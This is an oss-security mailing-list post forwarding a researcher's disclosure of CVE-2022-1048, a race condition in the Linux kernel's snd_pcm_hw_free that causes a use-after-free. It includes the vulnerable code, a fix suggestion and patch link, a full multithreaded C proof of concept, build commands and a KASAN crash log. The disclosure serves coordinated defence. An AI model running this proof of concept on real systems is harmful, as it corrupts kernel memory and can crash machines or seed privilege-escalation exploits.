X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["131738" "Monday" "28" "March" "2022" "22:06:40" "+0800" "Hu Jiahui" "kirin.say@gmail.com" nil "3130" "[oss-security] Linux Kernel: Race Condition in snd_pcm_hw_free leading to use-after-free" nil nil nil "3" nil nil (number mark "U       kirin.say@gm Mar 28 3130/131738 " thread-indent "\"[oss-security] Linux Kernel: Race Condition in snd_pcm_hw_free leading to use-after-free\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux Kernel: Race Condition in snd_pcm_hw_free leading to use-after-free" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 17600 invoked by uid 550); 28 Mar 2022 14:26:02 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30045 invoked from network); 28 Mar 2022 14:07:04 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
        bh=JIWOagkCySKOkPdyBcOerDQRwD5dtaO+ICr33P9upFA=;
        b=g84BvEAWu44DcCCO0zC5ntRfLAZhyEe9afG9gaCx8fARkxn8qPwBYUQygZ1IIuac8W
         pUI+Q8e2Qu1J0vCc+VlDCaU6FFYIHHrnFFzhWN83w9/6wswnljj0/yqjR3NAjqY1PP/M
         Hb9V5PgiyKWwzCxet01qgMaAPcxc2dp3xjVFDj/WR9Aon5ooYJg6qje/QSosM0saz3/h
         zlT0aScm/Iki7+/CHz5L3NlunXRlY3Hnrc7ZS8+9NEJtaTamyNiUSxQVjBTlRzzFmWMd
         GaWc603Ji5t8EVOE7yP81M23nQ1HLG7Df3cVPGbKHK6RYrTooooaakx7PiMcHrkjSeWN
         mxyw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
         :message-id:subject:to;
        bh=JIWOagkCySKOkPdyBcOerDQRwD5dtaO+ICr33P9upFA=;
        b=Ppxhz7fV+5LpUMJSpP9jAAAH5MbIaMFO3EMbqBzl8JuCnQomJ2QwiuqtmXJiUtbqQE
         heKlfdRjCsUNwH46QvrO58OWz0Et5F9IkLM9DY9gC7jovEcTDxpo95Xkn88b64hmgZ6G
         wztdG0pwYkKuHaRzBJwLk1wU3dzAvW4xuZzPi3soup671KjTYYNpg1zw7vheoeLmul3T
         tVM55LnS4wn+icI1DGoh6YGuuGFoaqbfLy6lx3Bv0UtMfHd8jSViulhasKos5KAWPvrh
         cgIWD47sZ5rPt1vNYyEJb9S8S1qbYmd/cZuP1bfaY1QzFzsV1uPaO4y3dcjOEiuJyEM3
         UV+Q==
X-Gm-Message-State: AOAM532RQ+/g150RxwqjY4+lpqWQmz8jQHHKtP4Y4Eu+aOYo+YfNejSS
	/lCiqAMCopK8LdMl/bIz38aE0GuxhvlF7tGLcQvr5TccP89CdgoEX6c=
X-Google-Smtp-Source: ABdhPJwm2/TxNX4gwfSpVSVAqMM/Kz1aKdkoU8rBLGGlDZLZ6Teoyhd0nMIfCc8WPUxe9lTMYrAuB4my50iGMHyLgro=
X-Received: by 2002:a67:71c3:0:b0:31e:bf14:7f2a with SMTP id
 m186-20020a6771c3000000b0031ebf147f2amr10133892vsc.76.1648476411818; Mon, 28
 Mar 2022 07:06:51 -0700 (PDT)
MIME-Version: 1.0
References: <CALEGWSUG_cyWhaTN1qZws+B7EZZV5ZyA=mRXLYBKFjtfReAeVg@mail.gmail.com>
In-Reply-To: <CALEGWSUG_cyWhaTN1qZws+B7EZZV5ZyA=mRXLYBKFjtfReAeVg@mail.gmail.com>
From: Hu Jiahui <kirin.say@gmail.com>
Date: Mon, 28 Mar 2022 22:06:40 +0800
Message-ID: <CALEGWSVZuFb8iKaO9u6cW3bOpi7EPANPat+DV20_9tahbRGtkg@mail.gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary="000000000000f2ac2005db47d2cc"
Subject: [oss-security] Linux Kernel: Race Condition in snd_pcm_hw_free leading to use-after-free

--000000000000f2ac2005db47d2cc
Content-Type: multipart/alternative; boundary="000000000000f2ac1e05db47d2ca"

--000000000000f2ac1e05db47d2ca
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

This is the original report about CVE-2022-1048.

Patch: https://lore.kernel.org/all/20220322170720.3529-1-tiwai@suse.de/#t


---------- Forwarded message ---------
=E5=8F=91=E4=BB=B6=E4=BA=BA=EF=BC=9A Hu Jiahui <kirin.say@gmail.com>
Date: 2022=E5=B9=B43=E6=9C=8820=E6=97=A5=E5=91=A8=E6=97=A5 22:22
Subject: [vs] Linux Kernel: Race Condition in snd_pcm_hw_free leading to
use-after-free
To: <security@kernel>, <linux-distros>


# Linux Kernel: Race Condition in snd_pcm_hw_free leading to use-after-free


## Details


In the path: snd_pcm_common_ioctl -> snd_pcm_hw_free:


```c

static int snd_pcm_hw_free(struct snd_pcm_substream *substream)

{

struct snd_pcm_runtime *runtime;

int result;


if (PCM_RUNTIME_CHECK(substream))

return -ENXIO;

runtime =3D substream->runtime;

snd_pcm_stream_lock_irq(substream);

switch (runtime->status->state) {

case SNDRV_PCM_STATE_SETUP:

case SNDRV_PCM_STATE_PREPARED:

break;

default:

snd_pcm_stream_unlock_irq(substream);

return -EBADFD;

}

snd_pcm_stream_unlock_irq(substream);

if (atomic_read(&substream->mmap_count))

return -EBADFD;

result =3D do_hw_free(substream);

snd_pcm_set_state(substream, SNDRV_PCM_STATE_OPEN);

cpu_latency_qos_remove_request(&substream->latency_pm_qos_req);

return result;

}

```

It seems like that the function calls the unlock too early, this may lead
to a race condition in the following code.

And if two threads call do_hw_free->snd_pcm_lib_free_pages at the same time:

```

int snd_pcm_lib_free_pages(struct snd_pcm_substream *substream)

{

struct snd_card *card =3D substream->pcm->card;

struct snd_pcm_runtime *runtime;


if (PCM_RUNTIME_CHECK(substream))

return -EINVAL;

runtime =3D substream->runtime;

if (runtime->dma_area =3D=3D NULL)

return 0;

if (runtime->dma_buffer_p !=3D &substream->dma_buffer) { // ******** 1
********

/* it's a newly allocated buffer. release it now. */

do_free_pages(card, runtime->dma_buffer_p);

kfree(runtime->dma_buffer_p); // ******** 2 ********

}

snd_pcm_set_runtime_buffer(substream, NULL);

return 0;

}

```

=3D> It will lead to a use-after-free(double free) issue in the kernel.


## Suggestion


Add a lock to the snd_pcm_hw_free and unlock it when return.


## POC


To trigger this vulnerability at (2), the poc should bypass the check in
snd_pcm_lib_free_pages:(1). Actually, whether to apply for new memory here
is related to the sound driver used in the system.

If we add a virtual machine in VirtualBox with Ubuntu. The default sound
driver is intel8x0, and in this driver we can alloc a new buffer and bypass
the check in (1) easily.

(But in the Vmware, the driver has requested the maximum memory size in
advance. To trigger the vulnerability, we must write the
"/proc/xxx/xxx/prealloc" file in sound card to force the driver to apply
for a smaller buffer(in function snd_pcm_lib_preallocate_proc_write) so
that we can alloc a new buffer in snd_pcm_lib_malloc_pages later.)


**The POC:**


```

#include <stdio.h>

#include <stdlib.h>

#include "alsa/asoundlib.h"

#include <stdbool.h>

#include <sys/socket.h>

#include <sys/msg.h>

#include <sys/mman.h>

#include <sys/wait.h>

#include <unistd.h>

#include <string.h>

#include <stdlib.h>

#include <arpa/inet.h>

#include <sys/stat.h>

#include <fcntl.h>

#include <sched.h>

#include <sys/ioctl.h>

#include <sys/types.h>

#include <stdio.h>

#include <sys/ipc.h>

#include <sys/msg.h>


#include <sys/socket.h>

#include <sys/syscall.h>

#include <linux/if_packet.h>

#include <linux/if_ether.h>

#include <linux/if_arp.h>

#include <sys/socket.h>

#include <sys/syscall.h>

#include <linux/if_packet.h>

#include <linux/if_ether.h>

#include <linux/if_arp.h>

typedef unsigned int __u32;

#define SNDRV_PCM_HW_PARAM_ACCESS 0 /* Access type */

#define SNDRV_PCM_HW_PARAM_FORMAT 1 /* Format */

#define SNDRV_PCM_HW_PARAM_SUBFORMAT 2 /* Subformat */

#define SNDRV_PCM_HW_PARAM_FIRST_MASK SNDRV_PCM_HW_PARAM_ACCESS

#define SNDRV_PCM_HW_PARAM_LAST_MASK SNDRV_PCM_HW_PARAM_SUBFORMAT


#define SNDRV_PCM_HW_PARAM_SAMPLE_BITS 8 /* Bits per sample */

#define SNDRV_PCM_HW_PARAM_FRAME_BITS 9 /* Bits per frame */

#define SNDRV_PCM_HW_PARAM_CHANNELS 10 /* Channels */

#define SNDRV_PCM_HW_PARAM_RATE 11 /* Approx rate */

#define SNDRV_PCM_HW_PARAM_PERIOD_TIME 12 /* Approx distance between

* interrupts in us

*/

#define SNDRV_PCM_HW_PARAM_PERIOD_SIZE 13 /* Approx frames between

* interrupts

*/

#define SNDRV_PCM_HW_PARAM_PERIOD_BYTES 14 /* Approx bytes between

* interrupts

*/

#define SNDRV_PCM_HW_PARAM_PERIODS 15 /* Approx interrupts per

* buffer

*/

#define SNDRV_PCM_HW_PARAM_BUFFER_TIME 16 /* Approx duration of buffer

* in us

*/

#define SNDRV_PCM_HW_PARAM_BUFFER_SIZE 17 /* Size of buffer in frames */

#define SNDRV_PCM_HW_PARAM_BUFFER_BYTES 18 /* Size of buffer in bytes */

#define SNDRV_PCM_HW_PARAM_TICK_TIME 19 /* Approx tick duration in us */

#define SNDRV_PCM_HW_PARAM_FIRST_INTERVAL SNDRV_PCM_HW_PARAM_SAMPLE_BITS

#define SNDRV_PCM_HW_PARAM_LAST_INTERVAL SNDRV_PCM_HW_PARAM_TICK_TIME


struct snd_interval {

unsigned int min, max;

unsigned int openmin:1,

openmax:1,

integer:1,

empty:1;

};


#define SNDRV_MASK_MAX 256


struct snd_mask {

__u32 bits[(SNDRV_MASK_MAX+31)/32];

};


typedef struct {

int version;

int fd;

int card, device, subdevice;


volatile struct snd_pcm_mmap_status * mmap_status;

struct snd_pcm_mmap_control *mmap_control;

bool mmap_status_fallbacked;

bool mmap_control_fallbacked;

struct snd_pcm_sync_ptr *sync_ptr;


int period_event;

snd_timer_t *period_timer;

struct pollfd period_timer_pfd;

int period_timer_need_poll;

/* restricted parameters */

snd_pcm_format_t format;

int rate;

int channels;

/* for chmap */

unsigned int chmap_caps;

snd_pcm_chmap_query_t **chmap_override;

} snd_pcm_hw_t;


struct snd_pcm_hw_params {

unsigned int flags;

struct snd_mask masks[SNDRV_PCM_HW_PARAM_LAST_MASK -

SNDRV_PCM_HW_PARAM_FIRST_MASK + 1];

struct snd_mask mres[5]; /* reserved masks */

struct snd_interval intervals[SNDRV_PCM_HW_PARAM_LAST_INTERVAL -

SNDRV_PCM_HW_PARAM_FIRST_INTERVAL + 1];

struct snd_interval ires[9]; /* reserved intervals */

unsigned int rmask; /* W: requested masks */

unsigned int cmask; /* R: changed masks */

unsigned int info; /* R: Info flags for returned setup */

unsigned int msbits; /* R: used most significant bits */

unsigned int rate_num; /* R: rate numerator */

unsigned int rate_den; /* R: rate denominator */

snd_pcm_uframes_t fifo_size; /* R: chip FIFO size in frames */

unsigned char reserved[64]; /* reserved for future */

};

int k;

int magic_fd;

unsigned char hw_params_data[] =3D

{

0x00, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x10, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x04, 0x00,

0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00,

0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00,

0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x40, 0x1F, 0x00, 0x00,

0x80, 0xBB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0x35,

0x05, 0x00, 0x00, 0x40, 0x1F, 0x00, 0x01, 0x00, 0x00, 0x00,

0x00, 0x48, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x04, 0x00,

0x00, 0x00, 0x00, 0x20, 0x01, 0x00, 0x00, 0x20, 0x01, 0x00,

0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00,

0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x55, 0x35, 0x05, 0x00,

0x00, 0x40, 0x1F, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x48,

0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,

0x00, 0x20, 0x01, 0x00, 0x00, 0x20, 0x01, 0x00, 0x04, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0xFF, 0x07, 0x00,

0x03, 0x01, 0x0D, 0x80, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,

0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

};

void race(){

while(k!=3D1){};

ioctl(magic_fd,0x4112,0);

}

int main(int argc, char *argv[])

{

int i;

int j;

int fd;

snd_pcm_hw_params_t *ptr;

snd_pcm_hw_params_malloc(&ptr);

memcpy(ptr, hw_params_data, 0x260);

magic_fd =3D open("/dev/snd/pcmC0D1c", 0);

printf("[+] CHECK FD: %d\n",magic_fd);

ioctl(magic_fd, 0xC2604111, ptr);

#define RACE_NUM 20

pthread_t race_thread[RACE_NUM]=3D{};

for(int i=3D0;i<RACE_NUM;i++){

pthread_create(&race_thread[i],NULL,race,NULL);

}

k=3D1;

for(int i=3D0;i<RACE_NUM;i++){

pthread_join(race_thread[i],NULL);

}

return 0;

}

```


To trigger it easily, please run it in VirtualBox with Ubuntu(with latest
stable kernel version), and make sure that the user has permission to open
"/dev/snd/pcmC0D1c"(in user group: audio) :

```

sudo apt-get install libasound2-dev

gcc exp.c -lasound -lpthread -ldl -lm -o poc

./poc # I lost a stable version of POC, you may need to run the poc(above)
several times to see a kasan log of use-after-free.

```


## Reporter


Kirin(@Pwnrin) of Tencent Security Xuanwu Lab


## KASAN LOG

```

[ 141.594199] BUG: Bad page state in process exp pfn:79140

[ 141.594201]
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D

[ 141.594213] BUG: KASAN: use-after-free in snd_dma_free_pages+0x2cd/0x380
[snd_pcm]

[ 141.594217] Read of size 4 at addr ffff8880b34c9400 by task exp/1956


[ 141.594224] CPU: 1 PID: 1956 Comm: exp Not tainted 5.4.166 #1

[ 141.594226] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS
VirtualBox 12/01/2006

[ 141.594228] page:ffffea0001e45000 refcount:-1 mapcount:0
mapping:0000000000000000 index:0x0 compound_mapcount: 0

[ 141.594231] flags: 0xfffffc0010000(head)

[ 141.594232] Call Trace:

[ 141.594253] dump_stack+0x96/0xc7

[ 141.594255] raw: 000fffffc0010000 dead000000000100 dead000000000122
0000000000000000

[ 141.594264] print_address_description.constprop.0+0x20/0x210

[ 141.594265] raw: 0000000000000000 0000000000000000 ffffffffffffffff
0000000000000000

[ 141.594266] page dumped because: nonzero _refcount

[ 141.594272] ? snd_dma_free_pages+0x2cd/0x380 [snd_pcm]

[ 141.594275] __kasan_report.cold+0x37/0x77

[ 141.594276] Modules linked in: nls_iso8859_1

[ 141.594283] ? snd_dma_free_pages+0x2cd/0x380 [snd_pcm]

[ 141.594284] intel_rapl_msr snd_intel8x0 snd_ac97_codec ac97_bus

[ 141.594289] kasan_report+0x14/0x20

[ 141.594289] snd_pcm snd_seq_midi

[ 141.594293] __asan_report_load4_noabort+0x14/0x20

[ 141.594294] snd_seq_midi_event snd_rawmidi

[ 141.594300] snd_dma_free_pages+0x2cd/0x380 [snd_pcm]

[ 141.594300] snd_seq intel_rapl_common crct10dif_pclmul

[ 141.594308] snd_pcm_lib_free_pages+0xc6/0x250 [snd_pcm]

[ 141.594308] ghash_clmulni_intel snd_seq_device joydev

[ 141.594314] snd_intel8x0_hw_free+0x98/0x170 [snd_intel8x0]

[ 141.594314] cryptd snd_timer rapl

[ 141.594321] snd_pcm_common_ioctl+0x5d5/0x1b00 [snd_pcm]

[ 141.594322] input_leds serio_raw snd vboxguest

[ 141.594329] ? snd_pcm_status_user+0x130/0x130 [snd_pcm]

[ 141.594330] soundcore mac_hid sch_fq_codel vmwgfx ttm

[ 141.594338] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]

[ 141.594339] drm_kms_helper fb_sys_fops syscopyarea

[ 141.594344] do_vfs_ioctl+0x9da/0x1020

[ 141.594345] sysfillrect sysimgblt drm

[ 141.594349] ? ioctl_preallocate+0x1c0/0x1c0

[ 141.594349] parport_pc ppdev

[ 141.594353] ? __kasan_check_write+0x14/0x20

[ 141.594353] lp parport ip_tables

[ 141.594357] ? __fget+0x21c/0x3d0

[ 141.594358] x_tables autofs4 hid_generic

[ 141.594362] ? copy_fd_bitmaps+0x2e0/0x2e0

[ 141.594363] usbhid hid psmouse

[ 141.594366] ? __switch_to_asm+0x40/0x70

[ 141.594367] crc32_pclmul ahci

[ 141.594369] ? __switch_to_asm+0x34/0x70

[ 141.594370] libahci e1000

[ 141.594373] ? __switch_to_asm+0x40/0x70

[ 141.594373] i2c_piix4 pata_acpi

[ 141.594376] ? __switch_to_asm+0x34/0x70

[ 141.594376] video

[ 141.594381] ? __fget_light+0x17e/0x1f0

[ 141.594384] ksys_ioctl+0x67/0x90

[ 141.594387] __x64_sys_ioctl+0x73/0xb0

[ 141.594391] ? fpregs_assert_state_consistent+0x22/0xa0

[ 141.594395] do_syscall_64+0x9f/0x3c0

[ 141.594398] ? syscall_return_slowpath+0x1a5/0x220

[ 141.594402] entry_SYSCALL_64_after_hwframe+0x44/0xa9

[ 141.594404] RIP: 0033:0x4e68b7

[ 141.594409] Code: 4f 55 04 00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3
90 48 89 e8 48 f7 d8 48 39 c3 0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05
<48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48

[ 141.594410] RSP: 002b:00007fab6baaada8 EFLAGS: 00000246 ORIG_RAX:
0000000000000010

[ 141.594414] RAX: ffffffffffffffda RBX: 0000000000000000 RCX:
00000000004e68b7

[ 141.594415] RDX: 0000000000000000 RSI: 0000000000004112 RDI:
0000000000000003

[ 141.594417] RBP: 00007fab6baaadb0 R08: 00007fab6baab700 R09:
00007fab6baab700

[ 141.594419] R10: 00007fab6baab9d0 R11: 0000000000000246 R12:
00007fab6baaae80

[ 141.594421] R13: 0000000000000000 R14: 0000000000000000 R15:
00007ffe52234d70


[ 141.594427] CPU: 2 PID: 1948 Comm: exp Not tainted 5.4.166 #1

[ 141.594429] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS
VirtualBox 12/01/2006

[ 141.594430] Call Trace:

[ 141.594431] Allocated by task 1946:

[ 141.594435] save_stack+0x23/0x90

[ 141.594438] __kasan_kmalloc.constprop.0+0xcf/0xe0

[ 141.594441] dump_stack+0x96/0xc7

[ 141.594443] kasan_kmalloc+0x9/0x10

[ 141.594445] bad_page.cold+0xfb/0x120

[ 141.594448] kmem_cache_alloc_trace+0x113/0x290

[ 141.594450] ? si_mem_available+0x310/0x310

[ 141.594456] snd_pcm_lib_malloc_pages+0x2bd/0x680 [snd_pcm]

[ 141.594458] ? __kasan_check_write+0x14/0x20

[ 141.594461] snd_intel8x0_hw_params+0x10d/0x550 [snd_intel8x0]

[ 141.594464] ? mutex_lock+0x8f/0xe0

[ 141.594469] snd_pcm_hw_params+0x2c6/0x1250 [snd_pcm]

[ 141.594471] free_pages_check_bad+0x147/0x1b0

[ 141.594477] snd_pcm_common_ioctl+0x362/0x1b00 [snd_pcm]

[ 141.594479] __free_pages_ok+0x80d/0xa60

[ 141.594485] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]

[ 141.594488] __free_pages+0x47/0x50

[ 141.594491] do_vfs_ioctl+0x9da/0x1020

[ 141.594505] dma_direct_free_pages+0xc7/0x150

[ 141.594507] ksys_ioctl+0x67/0x90

[ 141.594510] dma_direct_free+0xe/0x10

[ 141.594512] __x64_sys_ioctl+0x73/0xb0

[ 141.594514] dma_free_attrs+0x61/0x150

[ 141.594517] do_syscall_64+0x9f/0x3c0

[ 141.594524] ? snd_ac97_pcm_close+0x2d3/0x5a0 [snd_ac97_codec]

[ 141.594527] entry_SYSCALL_64_after_hwframe+0x44/0xa9

[ 141.594532] snd_dma_free_pages+0x16b/0x380 [snd_pcm]


[ 141.594540] snd_pcm_lib_free_pages+0xc6/0x250 [snd_pcm]

[ 141.594542] Freed by task 1947:

[ 141.594545] snd_intel8x0_hw_free+0x11e/0x170 [snd_intel8x0]

[ 141.594552] snd_pcm_common_ioctl+0x5d5/0x1b00 [snd_pcm]

[ 141.594555] save_stack+0x23/0x90

[ 141.594560] ? snd_pcm_status_user+0x130/0x130 [snd_pcm]

[ 141.594563] __kasan_slab_free+0x137/0x180

[ 141.594568] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]

[ 141.594570] kasan_slab_free+0xe/0x10

[ 141.594573] do_vfs_ioctl+0x9da/0x1020

[ 141.594575] kfree+0x98/0x270

[ 141.594577] ? ioctl_preallocate+0x1c0/0x1c0

[ 141.594582] snd_pcm_lib_free_pages+0xed/0x250 [snd_pcm]

[ 141.594585] ? __kasan_check_write+0x14/0x20

[ 141.594588] snd_intel8x0_hw_free+0x11e/0x170 [snd_intel8x0]

[ 141.594590] ? __fget+0x21c/0x3d0

[ 141.594596] snd_pcm_common_ioctl+0x5d5/0x1b00 [snd_pcm]

[ 141.594598] ? copy_fd_bitmaps+0x2e0/0x2e0

[ 141.594603] snd_pcm_ioctl+0x6d/0xb0 [snd_pcm]

[ 141.594605] ? __switch_to_asm+0x40/0x70

[ 141.594607] ? __switch_to_asm+0x34/0x70

[ 141.594609] do_vfs_ioctl+0x9da/0x1020

[ 141.594611] ksys_ioctl+0x67/0x90

[ 141.594613] ? __switch_to_asm+0x40/0x70

[ 141.594614] __x64_sys_ioctl+0x73/0xb0

[ 141.594617] do_syscall_64+0x9f/0x3c0

[ 141.594619] ? __switch_to_asm+0x34/0x70

[ 141.594621] entry_SYSCALL_64_after_hwframe+0x44/0xa9

[ 141.594624] ? __fget_light+0x17e/0x1f0


[ 141.594627] ksys_ioctl+0x67/0x90

[ 141.594630] __x64_sys_ioctl+0x73/0xb0

[ 141.594633] ? fpregs_assert_state_consistent+0x22/0xa0

[ 141.594635] The buggy address belongs to the object at ffff8880b34c9400

which belongs to the cache kmalloc-64 of size 64

[ 141.594639] The buggy address is located 0 bytes inside of

64-byte region [ffff8880b34c9400, ffff8880b34c9440)

[ 141.594641] The buggy address belongs to the page:

[ 141.594644] page:ffffea0002cd3240 refcount:1 mapcount:0
mapping:ffff8880c5403600 index:0x0

[ 141.594646] flags: 0xfffffc0000200(slab)

[ 141.594649] do_syscall_64+0x9f/0x3c0

[ 141.594652] ? syscall_return_slowpath+0x1a5/0x220

[ 141.594653] raw: 000fffffc0000200 ffffea0001e253c0 0000000c0000000c
ffff8880c5403600

[ 141.594657] entry_SYSCALL_64_after_hwframe+0x44/0xa9

[ 141.594658] raw: 0000000000000000 0000000080200020 00000001ffffffff
0000000000000000

[ 141.594659] page dumped because: kasan: bad access detected

[ 141.594661] RIP: 0033:0x4e68b7


[ 141.594664] Code: 4f 55 04 00 85 c0 78 df 48 83 c4 08 48 89 d8 5b 5d c3
90 48 89 e8 48 f7 d8 48 39 c3 0f 92 c0 eb b4 66 90 b8 10 00 00 00 0f 05
<48> 3d 01 f0 ff ff 73 01 c3 48 c7 c1 b8 ff ff ff f7 d8 64 89 01 48

[ 141.594666] RSP: 002b:00007fab6fab2da8 EFLAGS: 00000246 ORIG_RAX:
0000000000000010

[ 141.594668] Memory state around the buggy address:

[ 141.594670] RAX: ffffffffffffffda RBX: 0000000000000000 RCX:
00000000004e68b7

[ 141.594672] RDX: 0000000000000000 RSI: 0000000000004112 RDI:
0000000000000003

[ 141.594674] RBP: 00007fab6fab2db0 R08: 00007fab6fab3700 R09:
00007fab6fab3700

[ 141.594675] ffff8880b34c9300: fb fb fb fb fb fb fb fb fc fc fc fc fc fc
fc fc

[ 141.594678] ffff8880b34c9380: fb fb fb fb fb fb fb fb fc fc fc fc fc fc
fc fc

[ 141.594680] >ffff8880b34c9400: fb fb fb fb fb fb fb fb fc fc fc fc fc fc
fc fc

[ 141.594682] ^

[ 141.594684] ffff8880b34c9480: fb fb fb fb fb fb fb fb fc fc fc fc fc fc
fc fc

